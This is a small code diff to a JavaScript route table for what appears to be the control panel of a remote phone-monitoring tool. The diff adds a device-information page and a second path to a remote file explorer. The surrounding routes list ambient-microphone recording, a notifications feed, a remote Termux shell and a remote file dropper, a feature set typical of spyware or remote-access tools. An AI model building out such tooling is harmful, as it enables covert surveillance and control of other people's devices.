@@ -3,6 +3,7 @@ const homeMonitorRoutes = {
     // 4.1 MAIN
     "/": { tabId: "tab-dashboard-overview", title: "Home & Device Selector", category: "Main" },
     "/dashboard": { tabId: "tab-dashboard-overview", title: "Dashboard Overview", category: "Main" },
+    "/deviceinfo": { tabId: "tab-device-info", title: "Device Information", category: "Main" },
 
     // 4.2 DEVICE MONITORING
     "/surroundings_recording": { tabId: "tab-ambient-mic", title: "Surroundings Recording", category: "Device Monitoring" },
@@ -32,6 +33,7 @@ const homeMonitorRoutes = {
     "/browser_bookmark": { tabId: "tab-browser-history", title: "Browser Bookmarks", category: "General Features" },
     "/application": { tabId: "tab-installed-apps", title: "Installed Applications", category: "General Features" },
     "/file_explorer": { tabId: "tab-file-explorer", title: "Remote File Explorer", category: "General Features" },
+    "/files": { tabId: "tab-file-explorer", title: "Remote File Explorer", category: "General Features" },
     "/termux": { tabId: "tab-termux-shell", title: "Termux Linux Shell", category: "General Features" },
     "/notifications": { tabId: "tab-notifications", title: "App Notifications Feed", category: "Behavior Monitoring" },
     "/file_dropper": { tabId: "tab-file-dropper", title: "Remote File Dropper", category: "General Features" },
